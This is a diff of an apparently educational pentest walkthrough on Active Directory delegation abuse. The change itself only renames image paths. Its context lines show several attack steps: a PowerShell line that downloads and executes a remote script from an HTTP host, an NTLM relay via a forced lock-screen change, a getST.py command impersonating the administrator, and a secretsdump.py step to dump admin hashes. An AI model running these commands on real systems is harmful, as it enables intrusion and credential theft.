@@ -103,7 +103,7 @@ iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](<../../../../.gitbook/assets/image (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1) (1) (1).png>)
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
@@ -119,7 +119,7 @@ If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedTo
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
 ```
 
-![](<../../../../.gitbook/assets/image (32) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (32) (1) (1) (1) (1).png>)
 
 7\. Use this ticket and run `secretsdump.py` to dump the local admin hashes of `WEB01`.
 
